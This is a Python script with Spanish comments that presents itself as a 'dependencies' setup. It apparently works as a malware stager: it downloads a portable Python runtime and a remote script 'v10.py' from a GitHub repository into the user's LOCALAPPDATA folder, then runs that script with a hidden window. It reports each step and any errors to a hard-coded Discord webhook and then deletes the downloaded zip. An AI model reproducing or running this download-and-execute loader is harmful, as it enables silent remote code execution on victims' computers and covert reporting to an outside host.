import os
import zipfile
import urllib.request
import subprocess
import json

# Enlaces directos oficiales de tu repositorio
URL_PY_ZIP = "https://github.com/zzzzsit4/v10/releases/download/new/py.zip"
URL_V10 = "https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py"

WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0Xw42HTs_y6KsVLBZSQ6pUqpN59eM1K044bhjU7iwHBh4bSCfA7bvc6jO6"

# Rutas locales
DIRECTORIO_DESTINO = os.path.join(os.environ.get("LOCALAPPDATA", "C:\\"), "V10Runtime")
ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")
SCRIPT_V10 = os.path.join(DIRECTORIO_DESTINO, "v10.py")

def enviar_webhook(mensaje):
    if "TU_WEBHOOK_URL" in WEBHOOK_URL or not WEBHOOK_URL:
        return
    try:
        payload = json.dumps({"content": mensaje}).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        )
        urllib.request.urlopen(req)
    except Exception:
        pass

def encontrar_python():
    # Busca python.exe en la raíz o en cualquier subcarpeta extraída del ZIP
    for root, dirs, files in os.walk(DIRECTORIO_DESTINO):
        if "python.exe" in files:
            return os.path.join(root, "python.exe")
    return None

def preparar_y_ejecutar():
    try:
        enviar_webhook("🔄 [Dependencias] Iniciando proceso de configuración...")
        
        if not os.path.exists(DIRECTORIO_DESTINO):
            os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)
            
        # 1. Descargar y extraer el Python portable si no está configurado
        python_ejecutable = encontrar_python()
        if not python_ejecutable:
            enviar_webhook("📥 [Dependencias] Descargando py.zip desde GitHub Releases...")
            urllib.request.urlretrieve(URL_PY_ZIP, ZIP_TEMPORAL)
            
            enviar_webhook("📦 [Dependencias] Extrayendo archivos portables...")
            with zipfile.ZipFile(ZIP_TEMPORAL, 'r') as zip_ref:
                zip_ref.extractall(DIRECTORIO_DESTINO)
                
            # Habilitar soporte de librerías externas (site-packages) en el archivo .pth
            for root, dirs, files in os.walk(DIRECTORIO_DESTINO):
                for archivo in files:
                    if archivo.endswith("._pth"):
                        ruta_pth = os.path.join(root, archivo)
                        with open(ruta_pth, "r", encoding="utf-8") as f:
                            contenido = f.read()
                        if "#import site" in contenido:
                            contenido = contenido.replace("#import site", "import site")
                            with open(ruta_pth, "w", encoding="utf-8") as f:
                                f.write(contenido)
                                
            python_ejecutable = encontrar_python()
            enviar_webhook("⚙️ [Dependencias] Entorno portable configurado.")

        # 2. Descargar la versión más reciente de v10.py
        enviar_webhook("📥 [Dependencias] Descargando v10.py...")
        urllib.request.urlretrieve(URL_V10, SCRIPT_V10)

        # 3. Validar y ejecutar v10
        if python_ejecutable and os.path.exists(SCRIPT_V10):
            enviar_webhook(f"🚀 [Dependencias] Ejecutando v10.py con: {python_ejecutable}")
            
            # Usamos subprocess.run esperando a que v10 y v11 terminen sus webhooks
            resultado = subprocess.run(
                [python_ejecutable, SCRIPT_V10],
                creationflags=0x08000000,
                capture_output=True,
                text=True
            )
            
            if resultado.returncode == 0:
                enviar_webhook("✅ [Dependencias] v10 y v11 finalizaron correctamente.")
            else:
                enviar_webhook(f"⚠️ [Dependencias] v10 finalizó con código {resultado.returncode}. Error: {resultado.stderr[:200]}")
        else:
            enviar_webhook("❌ [Error]: No se encontró python.exe o v10.py tras la extracción.")
            
        # 4. Limpiar py.zip una vez finalizado todo el flujo
        if os.path.exists(ZIP_TEMPORAL):
            os.remove(ZIP_TEMPORAL)
            enviar_webhook("🧹 [Dependencias] py.zip eliminado del sistema.")
            
    except Exception as e:
        enviar_webhook(f"❌ [Error crítico en dependencias]: {str(e)}")

if __name__ == "__main__":
    preparar_y_ejecutar()
